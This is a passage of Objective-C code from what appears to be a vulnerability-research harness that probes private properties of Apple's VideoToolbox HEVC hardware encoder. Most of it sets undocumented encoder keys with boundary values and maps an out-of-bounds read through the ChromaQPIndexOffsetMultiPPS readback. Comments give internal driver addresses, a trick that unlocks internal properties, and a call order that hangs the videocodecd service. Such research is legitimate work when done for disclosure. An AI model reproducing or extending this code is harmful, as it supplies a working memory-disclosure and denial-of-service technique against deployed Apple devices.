        OSStatus stPreDA1 = -999, stPreDA2 = -999, stPreDAN = -999;
        OSStatus stPostDA1 = -999, stPostDA2 = -999, stPostDAN = -999;
        OSStatus stRefBuf = -999, stLtr = -999;
        int rbRefBuf = -1;
        NSString *preRbDesc = @"none";
        {
            Stage6ProbeResult *s12Res = Stage6AllocResult();
            VTCompressionSessionRef ps = NULL;
            if (s12Res && VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                                     NULL, NULL, NULL, Stage6OutputCallback, s12Res, &ps) == noErr && ps) {
                int effPSpacing = (rn <= 8) ? rn : 8;
                VTSessionSetProperty(ps, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
                VTSessionSetProperty(ps, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                VTSessionSetProperty(ps, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
                VTSessionSetProperty(ps, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
                stRefBuf = VTSessionSetProperty(ps, CFSTR("MultiReferencePSpacing"), (__bridge CFNumberRef)@(effPSpacing));
                stLtr = VTSessionSetProperty(ps, CFSTR("ForceRefUncompressed"), kCFBooleanTrue);
                VTSessionSetProperty(ps, CFSTR("UseReferenceCompressedBuffers"), kCFBooleanTrue);
                CFNumberRef rbRef = NULL;
                if (VTSessionCopyProperty(ps, CFSTR("MultiReferencePSpacing"), kCFAllocatorDefault, &rbRef) == noErr && rbRef) {
                    CFNumberGetValue(rbRef, kCFNumberIntType, &rbRefBuf);
                    CFRelease(rbRef);
                }
                stPreDA1 = VTSessionSetProperty(ps, CFSTR("DPBRequirements"), (__bridge CFTypeRef)reqDictArr1);
                stPreDAN = VTSessionSetProperty(ps, CFSTR("DPBRequirements"), (__bridge CFTypeRef)reqDictArrN);
                VTSessionSetProperty(ps, CFSTR("MVHEVCVideoLayerIDs"), (__bridge CFTypeRef)@[ @0, @1 ]);
                stPreDA2 = VTSessionSetProperty(ps, CFSTR("DPBRequirements"), (__bridge CFTypeRef)reqDictArr2);
                VTCompressionSessionPrepareToEncodeFrames(ps);

                CFTypeRef reqRb = NULL;
                OSStatus cpReq = VTSessionCopyProperty(ps, CFSTR("DPBRequirements"), kCFAllocatorDefault, &reqRb);
                if (cpReq == noErr && reqRb) {
                    if (CFGetTypeID(reqRb) == CFArrayGetTypeID()) {
                        preRbDesc = [NSString stringWithFormat:@"arr(%ld)", (long)CFArrayGetCount((CFArrayRef)reqRb)];
                    } else if (CFGetTypeID(reqRb) == CFDictionaryGetTypeID()) {
                        preRbDesc = [NSString stringWithFormat:@"dict(%ld)", (long)CFDictionaryGetCount((CFDictionaryRef)reqRb)];
                    } else {
                        preRbDesc = [NSString stringWithFormat:@"tid=%lu", (unsigned long)CFGetTypeID(reqRb)];
                    }
                    CFRelease(reqRb);
                } else {
                    preRbDesc = [NSString stringWithFormat:@"err=%d", (int)cpReq];
                }
                stPostDA1 = VTSessionSetProperty(ps, CFSTR("DPBRequirements"), (__bridge CFTypeRef)reqDictArr1);
                stPostDA2 = VTSessionSetProperty(ps, CFSTR("DPBRequirements"), (__bridge CFTypeRef)reqDictArr2);
                stPostDAN = VTSessionSetProperty(ps, CFSTR("DPBRequirements"), (__bridge CFTypeRef)reqDictArrN);
                s12Res->closed = 1;
                KPH9SafeTeardownEx(ps, NULL, s12Res);
            } else if (s12Res) {
                free(s12Res);
            }
        }

        // 2) @post-4p (5 warm frames -> cb#6 target, identical GOP position to 7B/7C) with MultiReferencePSpacing + dual non-zero IOSurfaceIDs
        Stage6ProbeResult *res = Stage6AllocResult();
        if (!res) continue;
        res->targetIdx = -1;
        VTCompressionSessionRef rs = NULL;
        NSDictionary *rspec = @{ @"EnableUserRefForFacetime": @YES };
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                       (__bridge CFDictionaryRef)rspec, NULL, NULL,
                                       Stage6OutputCallback, res, &rs) == noErr && rs) {
            VTSessionSetProperty(rs, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
            VTSessionSetProperty(rs, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
            VTSessionSetProperty(rs, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
            VTSessionSetProperty(rs, CFSTR("MultiReferencePSpacing"), (__bridge CFNumberRef)@(rn <= 8 ? rn : 8));
            KPH9PrimeRealTime(rs);
            OSStatus stFtPreDA1 = VTSessionSetProperty(rs, CFSTR("DPBRequirements"), (__bridge CFTypeRef)reqDictArr1);
            VTCompressionSessionPrepareToEncodeFrames(rs);

            int64_t rpts = 0;
            for (int warm = 0; warm < 5; warm++) {
                CVPixelBufferRef wpb = (__bridge CVPixelBufferRef)stage7Holders[(NSUInteger)warm % stage7Holders.count];
                VTCompressionSessionEncodeFrame(rs, wpb, CMTimeMake(rpts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
            }
            int ww = 0;
            while (res->cbCount < 5 && ww < 120) { usleep(2000); ww += 2; }

            // Set DPBRequirements (CFArray<CFDictionary>) AFTER warm frames so pcVCP is active
            OSStatus stFtDA1 = VTSessionSetProperty(rs, CFSTR("DPBRequirements"), (__bridge CFTypeRef)reqDictArr1);
            OSStatus stFtDAN = VTSessionSetProperty(rs, CFSTR("DPBRequirements"), (__bridge CFTypeRef)reqDictArrN);

            // Fill both elements of each pair (originalSurfaceID, rvraSurfaceID) with live encoded pool IDs (0..4)
            int pairElemCount = (rn <= 17) ? (rn * 2) : 34;
            NSMutableArray *rvraPairs = [NSMutableArray arrayWithCapacity:(NSUInteger)pairElemCount];
            for (int p = 0; p < pairElemCount / 2; p++) {
                [rvraPairs addObject:stage7PoolIDs[(NSUInteger)(p % 5)]];
                [rvraPairs addObject:stage7PoolIDs[(NSUInteger)((p + 1) % 5)]];
            }
            OSStatus stDpb = VTSessionSetProperty(rs, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)rvraPairs);
            NSString *dpbRb = Stage7ReadbackDPB(rs);

            // Structured SetDPB frame option dictionary matching kVTEncodeFrameOptionKey_DPB_* keys
            NSMutableArray *refDicts = [NSMutableArray array];
            for (int rf = 0; rf < 2; rf++) {
                [refDicts addObject:@{
                    @"FrameNumber": @(rf),
                    @"ReferenceType": @0,
                    @"IOSurfaceID": stage7PoolIDs[(NSUInteger)rf],
                    @"MSBIOSurfaceID": @0,
                }];
            }
            NSDictionary *setDpbDict = @{
                @"NumberOfReferenceFrames": @2,
                @"FrameNumberFromIDR": @5,
                @"LongTermFrameNumberFromIDR": @0,
                @"HowManyShortTermFromIDR": @2,
                @"DPBReferenceFrames": refDicts,
            };
            res->targetHit = 0;
            res->targetIdx = -1;
            NSDictionary *fp = @{
                @"SetDPB": setDpbDict,
                @"UserDPBFramesForFaceTime": rvraPairs,
                @"NumberOfReferenceFrames": @2,
                @"FrameNumberFromIDR": @5,
                @"HowManyShortTermFromIDR": @2,
                @"DPBReferenceFrames": refDicts,
            };
            CVPixelBufferRef tpb = (__bridge CVPixelBufferRef)stage7Holders[(NSUInteger)rpts % stage7Holders.count];
            OSStatus encT = VTCompressionSessionEncodeFrame(rs, tpb, CMTimeMake(rpts++, 30), kCMTimeInvalid,
                                                            (__bridge CFDictionaryRef)fp, (void *)(uintptr_t)0xCAFE, NULL);
            for (int fl = 0; fl < 4 && !res->targetHit; fl++) {
                CVPixelBufferRef fpb = (__bridge CVPixelBufferRef)stage7Holders[(NSUInteger)rpts % stage7Holders.count];
                VTCompressionSessionEncodeFrame(rs, fpb, CMTimeMake(rpts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
                int sw = 0;
                while (!res->targetHit && sw < 40) { usleep(2000); sw += 2; }
            }
            @synchronized ([KPH9EncoderModule class]) {
                res->closed = 1;
                const char *postCb = res->targetHit ? res->target : res->second;
                KPH9OutAppend(log, @"  dpbReq[n=%-2d] refBuf=%d(rb=%d,ltr=%d) pre(da1=%d,da2=%d,daN=%d) postIdr(da1=%d,da2=%d,daN=%d) ft(pre=%d,da1=%d,daN=%d) rbReq=%@ setDPB(x%d dual)=%d rbDPB=%@ enc=%d | cbPost(#%d): %s\n",
                              rn, (int)stRefBuf, rbRefBuf, (int)stLtr,
                              (int)stPreDA1, (int)stPreDA2, (int)stPreDAN,
                              (int)stPostDA1, (int)stPostDA2, (int)stPostDAN,
                              (int)stFtPreDA1, (int)stFtDA1, (int)stFtDAN, preRbDesc,
                              pairElemCount, (int)stDpb, dpbRb, (int)encT, res->targetIdx, postCb);
            }
            KPH9SafeTeardownEx(rs, NULL, res);
        } else {
            free(res);
        }
    }

    // 7E: ReadWrite CFArray layer & parameter-set ID properties (confirmed tid=19 in 7A)
    KPH9OutAppend(log, @"  [7E: Layer & Parameter-Set CFArray Properties (tid=19 ReadWrite + UserParameterSetsIds Exact Cutoff)]\n");
    NSArray<NSString *> *arrProps = @[
        @"MVHEVCVideoLayerIDs",
        @"MVHEVCViewIDs",
        @"MVHEVCLeftAndRightViewIDs",
        @"HEVCAuxiliaryLayerIDs",
        @"HEVCAuxiliaryIDs",
        @"RequiredMVHEVCSequenceParameterSetIDs",
        @"RequiredMVHEVCPictureParameterSetIDs",
        @"RequiredMVHEVCVideoParameterSetAlphaVideoLayerIDs",
        @"UserParameterSetsIds",
        @"ChromaQPIndexOffsetMultiPPS",
    ];
    NSMutableArray *a16 = [NSMutableArray arrayWithCapacity:16];
    NSMutableArray *a64 = [NSMutableArray arrayWithCapacity:64];
    for (int i = 0; i < 16; i++) [a16 addObject:@(i)];
    for (int i = 0; i < 64; i++) [a64 addObject:@(i % 16)];
    NSArray *shapes = @[
        @[ @"a1",  @[ @0 ] ],
        @[ @"a2",  @[ @0, @1 ] ],
        @[ @"a3",  @[ @0, @1, @2 ] ],
        @[ @"a4",  @[ @0, @1, @2, @3 ] ],
        @[ @"a16", a16 ],
        @[ @"a64", a64 ],
    ];
    for (NSString *propName in arrProps) {
        VTCompressionSessionRef as = NULL;
        NSDictionary *aspec = @{ @"EnableUserRefForFacetime": @YES };
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                       (__bridge CFDictionaryRef)aspec, NULL, NULL,
                                       NULL, NULL, &as) == noErr && as) {
            VTSessionSetProperty(as, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
            if ([propName isEqualToString:@"ChromaQPIndexOffsetMultiPPS"]) {
                // Set 7-element UserParameterSetsIds (4 PPS) so ChromaQPIndexOffsetMultiPPS readback returns 16 elements
                VTSessionSetProperty(as, CFSTR("UserParameterSetsIds"),
                                     (__bridge CFTypeRef)@[ @1, @2, @1, @2, @3, @4, @5 ]);
            } else if ([propName isEqualToString:@"HEVCAuxiliaryLayerIDs"] ||
                       [propName isEqualToString:@"HEVCAuxiliaryIDs"]) {
                VTSessionSetProperty(as, CFSTR("EncodesAuxiliaryWithAuxID"), (__bridge CFNumberRef)@1);
            } else if (![propName isEqualToString:@"MVHEVCVideoLayerIDs"] &&
                       ![propName isEqualToString:@"UserParameterSetsIds"]) {
                // Enable 2-layer MV-HEVC first so layer-dependent array properties are active
                VTSessionSetProperty(as, CFSTR("MVHEVCVideoLayerIDs"), (__bridge CFTypeRef)@[ @0, @1 ]);
            }
            NSMutableArray *resParts = [NSMutableArray array];
            for (NSArray *pair in shapes) {
                NSString *tag = pair[0];
                NSArray *val = pair[1];
                OSStatus st = VTSessionSetProperty(as, (__bridge CFStringRef)propName, (__bridge CFTypeRef)val);
                CFTypeRef rb = NULL;
                CFIndex rbCnt = -1;
                if (VTSessionCopyProperty(as, (__bridge CFStringRef)propName, kCFAllocatorDefault, &rb) == noErr && rb) {
                    if (CFGetTypeID(rb) == CFArrayGetTypeID()) rbCnt = CFArrayGetCount((CFArrayRef)rb);
                    CFRelease(rb);
                }
                [resParts addObject:[NSString stringWithFormat:@"%@=%d(rb=%ld)", tag, (int)st, (long)rbCnt]];
            }
            KPH9OutAppend(log, @"  arrProp[%@]: %@\n", propName, [resParts componentsJoinedByString:@" "]);
            KPH9SafeTeardown(as);
        }
    }

    // Exact element-count (15..24 fine step) & element-value boundary for UserParameterSetsIds + ChromaQPIndexOffsetMultiPPS
    {
        VTCompressionSessionRef ps = NULL;
        NSDictionary *pspec = @{ @"EnableUserRefForFacetime": @YES };
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                        (__bridge CFDictionaryRef)pspec, NULL, NULL,
                                        NULL, NULL, &ps) == noErr && ps) {
            int psLens[] = { 1, 2, 3, 4, 8, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 32 };
            NSMutableArray *lenParts = [NSMutableArray array];
            for (size_t li = 0; li < sizeof(psLens) / sizeof(psLens[0]); li++) {
                int ln = psLens[li];
                NSMutableArray *arr = [NSMutableArray arrayWithCapacity:(NSUInteger)ln];
                for (int k = 0; k < ln; k++) [arr addObject:@(k % 16)];
                OSStatus st = VTSessionSetProperty(ps, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)arr);
                CFTypeRef rb = NULL;
                CFIndex rbCnt = -1;
                if (VTSessionCopyProperty(ps, CFSTR("UserParameterSetsIds"), kCFAllocatorDefault, &rb) == noErr && rb) {
                    if (CFGetTypeID(rb) == CFArrayGetTypeID()) rbCnt = CFArrayGetCount((CFArrayRef)rb);
                    CFRelease(rb);
                }
                [lenParts addObject:[NSString stringWithFormat:@"n%d=%d(rb=%ld)", ln, (int)st, (long)rbCnt]];
            }
            KPH9OutAppend(log, @"  UserParameterSetsIds[len]: %@\n", [lenParts componentsJoinedByString:@" "]);

            // Audit ChromaQPIndexOffsetMultiPPS readback expansion (rb = 4 * (plen - 3)) across plen = 3..21
            // Setter caps at 16 elements (n17=-12900), whereas CopyProperty scales with UserParameterSetsIds!
            NSArray *cqpSeed16 = @[ @(-12), @(-11), @(-10), @(-9), @(-8), @(-7), @(-6), @(-5),
                                    @(-4),  @(-3),  @(-2),  @(-1), @(1),  @(2),  @(3),  @(4) ];
            OSStatus stSeed16 = VTSessionSetProperty(ps, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpSeed16);
            int cqpPlens[] = { 3, 4, 5, 6, 7, 8, 9, 10, 12, 16, 21 };
            for (size_t ci = 0; ci < sizeof(cqpPlens) / sizeof(cqpPlens[0]); ci++) {
                int plen = cqpPlens[ci];
                NSMutableArray *pArr = [NSMutableArray arrayWithCapacity:(NSUInteger)plen];
                for (int k = 0; k < plen; k++) {
                    [pArr addObject:@((k < 2) ? (k + 1) : (k - 1))];
                }
                OSStatus stPs = VTSessionSetProperty(ps, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr);
                // Re-seed 16 elements after setting UserParameterSetsIds so slots 0..15 hold known markers
                OSStatus stReSeed = VTSessionSetProperty(ps, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpSeed16);
                NSMutableArray *cqp20 = [cqpSeed16 mutableCopy];
                [cqp20 addObjectsFromArray:@[ @5, @6, @7, @8 ]];
                OSStatus stSet20 = VTSessionSetProperty(ps, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqp20);
                CFTypeRef rbCqp = NULL;
                CFIndex rbCnt = -1;
                NSString *rbDump = @"none";
                if (VTSessionCopyProperty(ps, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbCqp) == noErr && rbCqp) {
                    if (CFGetTypeID(rbCqp) == CFArrayGetTypeID()) {
                        NSArray *nsCqp = (__bridge NSArray *)rbCqp;
                        rbCnt = (CFIndex)nsCqp.count;
                        rbDump = [NSString stringWithFormat:@"[%@]", [nsCqp componentsJoinedByString:@","]];
                    }
                    CFRelease(rbCqp);
                }
                KPH9OutAppend(log, @"  cqpOobRead[plen=%-2d]: ps=%d seed16=%d/%d set20=%d rb=%ld %@\n",
                              plen, (int)stPs, (int)stSeed16, (int)stReSeed, (int)stSet20, (long)rbCnt, rbDump);
            }
            VTSessionSetProperty(ps, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @0, @0, @0 ]);

            int psVals[] = { 0, 1, 3, 7, 15, 16, 31, 32, 63, 64, 255, 256, 65792, -1 };
            for (int slot = 0; slot < 3; slot++) {
                NSMutableArray *slotParts = [NSMutableArray array];
                for (size_t vi = 0; vi < sizeof(psVals) / sizeof(psVals[0]); vi++) {
                    int v = psVals[vi];
                    NSMutableArray *arr = [NSMutableArray arrayWithObjects:@0, @0, @0, nil];
                    arr[(NSUInteger)slot] = @(v);
                    OSStatus st = VTSessionSetProperty(ps, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)arr);
                    [slotParts addObject:[NSString stringWithFormat:@"v%d=%d", v, (int)st]];
                }
                KPH9OutAppend(log, @"  UserParameterSetsIds[slot%d]: %@\n", slot, [slotParts componentsJoinedByString:@" "]);
            }

            // Value boundaries for MVHEVCVideoLayerIDs & RequiredMVHEVC* (active when MVHEVCVideoLayerIDs=[0,1])
            int mvVals[] = { 0, 1, 2, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 31, 32, 33, 36, 48, 51, 52, 60, 62, 63, 64, 65, 127, 128, 129, 191, 192, 254, 255, 256, 65535, -1 };
            NSMutableArray *mvLayerParts = [NSMutableArray array];
            for (size_t mi = 0; mi < sizeof(mvVals) / sizeof(mvVals[0]); mi++) {
                int v = mvVals[mi];
                OSStatus st = VTSessionSetProperty(ps, CFSTR("MVHEVCVideoLayerIDs"), (__bridge CFTypeRef)@[ @0, @(v) ]);
                [mvLayerParts addObject:[NSString stringWithFormat:@"v%d=%d", v, (int)st]];
            }
            KPH9OutAppend(log, @"  MVHEVCVideoLayerIDs[0,v]: %@\n", [mvLayerParts componentsJoinedByString:@" "]);

            VTSessionSetProperty(ps, CFSTR("MVHEVCVideoLayerIDs"), (__bridge CFTypeRef)@[ @0, @1 ]);
            NSArray<NSString *> *mvReqProps = @[
                @"MVHEVCViewIDs",
                @"MVHEVCLeftAndRightViewIDs",
                @"RequiredMVHEVCSequenceParameterSetIDs",
                @"RequiredMVHEVCPictureParameterSetIDs",
                @"RequiredMVHEVCVideoParameterSetAlphaVideoLayerIDs",
                @"RequiredHEVCVideoParameterSetRepFormatBitDepths",
                @"RequiredHEVCVideoParameterSetRepFormatChromaFormatIdcs",
                @"ChromaQPIndexOffsetMultiPPS",
            ];
            for (NSString *mp in mvReqProps) {
                NSMutableArray *mpParts = [NSMutableArray array];
                for (size_t mi = 0; mi < sizeof(mvVals) / sizeof(mvVals[0]); mi++) {
                    int v = mvVals[mi];
                    OSStatus st = VTSessionSetProperty(ps, (__bridge CFStringRef)mp, (__bridge CFTypeRef)@[ @0, @(v) ]);
                    [mpParts addObject:[NSString stringWithFormat:@"v%d=%d", v, (int)st]];
                }
                KPH9OutAppend(log, @"  %@[0,v]: %@\n", mp, [mpParts componentsJoinedByString:@" "]);
            }

            // Scalar RequiredHEVC* + log2_max_minus4 + EncodesAuxiliaryWithAuxID + NumberOfSlices + MultiReferencePSpacing + LookAheadFrames
            VTSessionSetProperty(ps, CFSTR("MVHEVCVideoLayerIDs"), (__bridge CFTypeRef)@[ @0 ]);
            NSArray<NSString *> *scalarReqProps = @[
                @"RequiredHEVCSequenceParameterSetID",
                @"RequiredHEVCPictureParameterSetID",
                @"RequiredHEVCSequenceParameterSetRepFormatIndex",
                @"RequiredHEVCVideoParameterSetAlphaLayerID",
                @"log2_max_minus4",
                @"EncodesAuxiliaryWithAuxID",
                @"NumberOfSlices",
                @"MultiReferencePSpacing",
                @"LookAheadFrames",
                @"MaxAllowedFrameQP",
                @"MinAllowedFrameQP",
            ];
            for (NSString *spName in scalarReqProps) {
                NSMutableArray *spParts = [NSMutableArray array];
                for (size_t mi = 0; mi < sizeof(mvVals) / sizeof(mvVals[0]); mi++) {
                    int v = mvVals[mi];
                    OSStatus st = VTSessionSetProperty(ps, (__bridge CFStringRef)spName, (__bridge CFNumberRef)@(v));
                    [spParts addObject:[NSString stringWithFormat:@"v%d=%d", v, (int)st]];
                }
                KPH9OutAppend(log, @"  scalarProp[%@]: %@\n", spName, [spParts componentsJoinedByString:@" "]);
            }

            // Pre-prepare OOB & internal AVE_PROPERTY_KEY_* sweep on `ps` (which never calls PrepareToEncodeFrames or EncodeFrame):
            // 1) Setting "PropertyMode" = @1 (AVE_Prop_HEVC_SetPropertyMode at 0x5594148, entry [0] of the 191-entry HEVC table)
            //    writes 1 to [x19 + 0x122a0], causing AVE_Prop_SetProperty (0x54c32e4) and AVE_Prop_CopyProperty (0x54af33c)
            //    to keep w9 = 1 (0x101 pre-prepare / 0x201 post-prepare) and unlock all 62 internal AVE_PROPERTY_KEY_* properties!
            // 2) Seed ChromaQPIndexOffsetMultiPPS with cqpSeed16 (so cr[7] at pps[0]+0x60..0x63 = 4) and expand UserParameterSetsIds
            //    to plen=21 to monitor both cr[7] (pps[0]+0x60..0x63, byte 3 +0x63 = transquant_bypass_enabled_flag) and
            //    oob[0..27] (pps[0]+0x64..0xd3, byte 1 of oob[0] at +0x65 = entropy_coding_sync_enabled_flag).
            OSStatus stHwBeforePm = VTSessionSetProperty(ps, CFSTR("HwFeatureOn"), (__bridge CFNumberRef)@8);
            OSStatus stMergeBeforePm = VTSessionSetProperty(ps, CFSTR("NumOfMergeCandidates"), (__bridge CFNumberRef)@3);
            OSStatus stPm1 = VTSessionSetProperty(ps, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
            int rbPmVal = -1;
            CFNumberRef rbPm = NULL;
            if (VTSessionCopyProperty(ps, CFSTR("PropertyMode"), kCFAllocatorDefault, &rbPm) == noErr && rbPm) {
                CFNumberGetValue(rbPm, kCFNumberIntType, &rbPmVal);
                CFRelease(rbPm);
            }
            NSArray *cqpSeed16Pre = @[ @(-12), @(-11), @(-10), @(-9), @(-8), @(-7), @(-6), @(-5),
                                       @(-4),  @(-3),  @(-2),  @(-1), @(1),  @(2),  @(3),  @(4) ];
            VTSessionSetProperty(ps, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpSeed16Pre);
            NSMutableArray *pArr21Pre = [NSMutableArray arrayWithCapacity:21];
            for (int k = 0; k < 21; k++) [pArr21Pre addObject:@((k < 2) ? (k + 1) : (k - 1))];
            int preCr7 = 4;
            int preOob[28];
            for (int wi = 0; wi < 28; wi++) preOob[wi] = (wi == 0) ? 256 : 0;
            VTSessionSetProperty(ps, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr21Pre);
            CFTypeRef rbPreInit = NULL;
            if (VTSessionCopyProperty(ps, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbPreInit) == noErr && rbPreInit) {
                if (CFGetTypeID(rbPreInit) == CFArrayGetTypeID()) {
                    NSArray *nsPreInit = (__bridge NSArray *)rbPreInit;
                    if (nsPreInit.count >= 72) {
                        preCr7 = [nsPreInit[15] intValue];
                        for (int wi = 0; wi < 28; wi++) {
                            preOob[wi] = [nsPreInit[(NSUInteger)(2 * (wi + 8) + 1)] intValue];
                        }
                    }
                }
                CFRelease(rbPreInit);
            }
            NSArray *preCandPairs = @[
                @[ @"HwFeatureOn",             @8 ],
                @[ @"HwFeatureOff",            @8 ],
                @[ @"SwFeatureOn",             @1 ],
                @[ @"PerfFeatureOn",           @1 ],
                @[ @"AlgFeatureOn",            @1 ],
                @[ @"RCFeatureOn",             @1 ],
                @[ @"GOPFeatureOn",            @1 ],
                @[ @"RefFeatureOn",            @1 ],
                @[ @"QPModFeatureOn",          @1 ],
                @[ @"LambdaModFeatureOn",      @1 ],
                @[ @"ModeDecFeatureOn",        @1 ],
                @[ @"SEIFeatureOn",            @1 ],
                @[ @"VUIFeatureOn",            @1 ],
                @[ @"NumOfMergeCandidates",    @3 ],
                @[ @"ForceSliceRPS",           (id)kCFBooleanTrue ],
                @[ @"UseReferenceCompressedBuffers", (id)kCFBooleanTrue ],
                @[ @"InitialQPI",              @22 ],
                @[ @"NumOfPFrame",             @4 ],
                @[ @"NumOfBFrame",             @2 ],
                @[ @"NumOfTemporalLayer",      @2 ],
                @[ @"Quality",                 @0.5 ],
                @[ @"Quality",                 @1.0 ],
                @[ @"SpatialAdaptiveQPLevel",  @0 ],
                @[ @"QuantizationScalingMatrixPreset", @1 ],
                @[ @"EnableWeightedPrediction",(id)kCFBooleanTrue ],
            ];
            NSMutableArray *preStParts = [NSMutableArray array];
            NSMutableArray *preDiffHits = [NSMutableArray array];
            for (NSArray *cp in preCandPairs) {
                NSString *kName = cp[0];
                id kVal = cp[1];
                OSStatus stSet = VTSessionSetProperty(ps, (__bridge CFStringRef)kName, (__bridge CFTypeRef)kVal);
                [preStParts addObject:[NSString stringWithFormat:@"%@=%d", kName, (int)stSet]];
                CFTypeRef rbCand = NULL;
                if (VTSessionCopyProperty(ps, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbCand) == noErr && rbCand) {
                    if (CFGetTypeID(rbCand) == CFArrayGetTypeID()) {
                        NSArray *nsCand = (__bridge NSArray *)rbCand;
                        if (nsCand.count >= 72) {
                            int curCr7 = [nsCand[15] intValue];
                            int curAlias30 = [nsCand[30] intValue];
                            if (curCr7 != preCr7) {
                                [preDiffHits addObject:[NSString stringWithFormat:@"%@=%@(st=%d):cr[7]/ns[30](pps+0x60..0x63):%d->%d(0x%08x,alias30=0x%08x)",
                                                        kName, kVal, (int)stSet, preCr7, curCr7, (unsigned)curCr7, (unsigned)curAlias30]];
                                preCr7 = curCr7;
                            }
                            for (int wi = 0; wi < 28; wi++) {
                                int v = [nsCand[(NSUInteger)(2 * (wi + 8) + 1)] intValue];
                                if (v != preOob[wi]) {
                                    [preDiffHits addObject:[NSString stringWithFormat:@"%@=%@(st=%d):oob[%d](pps+0x%02x):%d->%d(0x%08x)",
                                                            kName, kVal, (int)stSet, wi, 0x64 + wi * 4, preOob[wi], v, (unsigned)v]];
                                    preOob[wi] = v;
                                }
                            }
                        }
                    }
                    CFRelease(rbCand);
                }
            }
            KPH9OutAppend(log, @"  cqpOobSweepPre[pm1=%d(rb=%d,before=%d/%d) props=%lu]: st=[%@] hits=%lu [%@]\n",
                          (int)stPm1, rbPmVal, (int)stHwBeforePm, (int)stMergeBeforePm,
                          (unsigned long)preCandPairs.count,
                          [preStParts componentsJoinedByString:@" "],
                          (unsigned long)preDiffHits.count,
                          [preDiffHits componentsJoinedByString:@", "]);
            VTSessionSetProperty(ps, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)@[ @1, @2, @1 ]);
            KPH9SafeTeardown(ps);
        }

        // Audit 72-int (288B) cqpOobRead[plen=21] window on a clean session (with Stage6OutputCallback):
        // CRITICAL: Never call SetProperty("UserParameterSetsIds", ...) BEFORE EncodeFrame on a session without
        // EnableUserRefForFacetime (and never set plen=21 before EncodeFrame), as touching UserParameterSetsIds
        // before EncodeFrame wedges videocodecd inside EncodeFrame!
        {
            NSMutableArray *pArr21 = [NSMutableArray arrayWithCapacity:21];
            for (int k = 0; k < 21; k++) [pArr21 addObject:@((k < 2) ? (k + 1) : (k - 1))];
            NSArray *cqpSeed16 = @[ @(-12), @(-11), @(-10), @(-9), @(-8), @(-7), @(-6), @(-5),
                                    @(-4),  @(-3),  @(-2),  @(-1), @(1),  @(2),  @(3),  @(4) ];
            dispatch_semaphore_t mapSem = dispatch_semaphore_create(0);
            CVPixelBufferRef pxHold = CVPixelBufferRetain(px);
            dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
                Stage6ProbeResult *mapRes = Stage6AllocResult();
                VTCompressionSessionRef mapS = NULL;
                if (mapRes && VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
                                                         NULL, NULL, NULL, Stage6OutputCallback, mapRes, &mapS) == noErr && mapS) {
                    KPH9PrimeRealTime(mapS);
                    VTSessionSetProperty(mapS, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
                    VTSessionSetProperty(mapS, CFSTR("ChromaQPIndexOffsetMultiPPS"), (__bridge CFTypeRef)cqpSeed16);

                    OSStatus prepMapSt = VTCompressionSessionPrepareToEncodeFrames(mapS);
                    OSStatus encMapSt = VTCompressionSessionEncodeFrame(mapS, pxHold, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                    int w0 = 0;
                    while (mapRes->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }

                    int prevCr7 = 4;
                    int prevOob[28];
                    for (int wi = 0; wi < 28; wi++) prevOob[wi] = (wi == 0) ? 256 : 0;

                    // Only AFTER EncodeFrame completes, expand UserParameterSetsIds to 21 elements and read back 72 ints
                    OSStatus postPs21St = VTSessionSetProperty(mapS, CFSTR("UserParameterSetsIds"), (__bridge CFTypeRef)pArr21);
                    CFTypeRef rbPost = NULL;
                    if (VTSessionCopyProperty(mapS, CFSTR("ChromaQPIndexOffsetMultiPPS"), kCFAllocatorDefault, &rbPost) == noErr && rbPost) {
                        if (CFGetTypeID(rbPost) == CFArrayGetTypeID()) {
                            NSArray *nsPost = (__bridge NSArray *)rbPost;
                            KPH9OutAppend(log, @"  cqpOobMap[prep=%d,enc=%d,cb=%d,ps21=%d]: rb=%lu [%@]\n",
                                          (int)prepMapSt, (int)encMapSt, mapRes->cbCount, (int)postPs21St,
                                          (unsigned long)nsPost.count, [nsPost componentsJoinedByString:@","]);
                            if (nsPost.count >= 72) {
                                prevCr7 = [nsPost[15] intValue];
                                NSMutableArray *cb8 = [NSMutableArray arrayWithCapacity:8];
                                NSMutableArray *cr8 = [NSMutableArray arrayWithCapacity:8];
